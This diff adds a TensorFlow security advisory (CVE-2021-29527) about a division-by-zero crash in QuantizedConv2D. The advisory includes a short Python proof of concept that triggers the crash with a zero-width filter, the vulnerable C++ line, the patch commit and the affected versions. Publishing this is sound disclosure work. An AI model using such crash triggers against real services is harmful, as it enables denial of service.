@@ -1,0 +1,35 @@
+<h2>TFSA-2021-016: Division by 0 in <code>QuantizedConv2D</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29527</p>
+<h3>Impact</h3>
+<p>An attacker can trigger a division by 0 in <code>tf.raw_ops.QuantizedConv2D</code>:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>input = tf.zeros([1, 1, 1, 1], dtype=tf.quint8)
+filter = tf.constant([], shape=[1, 0, 1, 1], dtype=tf.quint8)
+min_input = tf.constant(0.0)
+max_input = tf.constant(0.0001)
+min_filter = tf.constant(0.0)
+max_filter = tf.constant(0.0001)
+strides = [1, 1, 1, 1]
+padding = "SAME"</p>
+<p>tf.raw_ops.QuantizedConv2D(input=input, filter=filter, min_input=min_input, max_input=max_input, min_filter=min_filter, max_filter=max_filter, strides=strides, padding=padding)
+```</p>
+<p>This is because the
+<a href="https://github.com/tensorflow/tensorflow/blob/00e9a4d67d76703fa1aee33dac582acf317e0e81/tensorflow/core/kernels/quantized_conv_ops.cc#L257-L259">implementation</a> does a division by a quantity that is controlled by the caller:</p>
+<p><code>cc
+const int filter_value_count = filter_width * filter_height * input_depth;
+const int64 patches_per_chunk = kMaxChunkSize / (filter_value_count * sizeof(T1));</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/cfa91be9863a91d5105a3b4941096044ab32036b">cfa91be9863a91d5105a3b4941096044ab32036b</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.</p>
